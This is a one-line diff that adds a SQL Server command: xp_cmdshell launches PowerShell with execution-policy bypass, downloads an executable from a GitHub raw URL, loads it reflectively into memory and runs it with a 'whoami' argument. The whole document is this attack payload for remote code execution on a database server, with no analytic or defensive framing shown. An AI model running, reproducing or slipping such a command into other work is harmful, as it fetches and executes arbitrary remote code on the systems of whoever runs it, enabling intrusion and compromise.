@@ -1,0 +1,1 @@
+EXEC xp_cmdshell 'powershell -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $b=(New-Object Net.WebClient).DownloadData(''https://raw.githubusercontent.com/bimhybim-del/ai/main/gp.exe''); $a=[Reflection.Assembly]::Load([byte[]]$b); $a.EntryPoint.Invoke($null,@(,([string[]]@(''-cmd'',''cmd /c whoami''))))"'
